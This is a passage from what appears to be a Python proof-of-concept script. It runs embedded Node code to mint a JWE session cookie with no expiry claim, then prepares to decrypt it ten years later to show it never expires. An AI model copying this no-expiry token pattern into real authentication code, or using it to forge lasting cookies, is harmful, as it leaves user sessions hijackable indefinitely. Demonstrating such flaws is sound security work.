        const ENC = 'A256GCM';
        const ALG = 'dir';
        const BYTE_LENGTH = 32;
        const ENCRYPTION_INFO = 'JWE CEK';

        const payload = JSON.parse(process.env.PAYLOAD);
        const secret = process.env.SECRET;

        const encryptionSecret = await hkdf(DIGEST, secret, '', ENCRYPTION_INFO, BYTE_LENGTH);
        const token = await new jose.EncryptJWT(payload)
          .setProtectedHeader({ enc: ENC, alg: ALG })  // NO exp!
          .encrypt(encryptionSecret);

        console.log(token);
        """
    )

    token = node_run(js_encrypt, env={**os.environ, "PAYLOAD": payload_raw, "SECRET": secret})
    print(f"[+] Generated vulnerable session cookie (truncated): {token[:60]}…")

    # 2. Decrypt the same token 10 years in the future
    future_ts = int(time.time()) + 10 * 365 * 24 * 60 * 60
    js_decrypt = textwrap.dedent(
        """
        import hkdf from '@panva/hkdf';
        import * as jose from 'jose';

        const DIGEST = 'sha256';
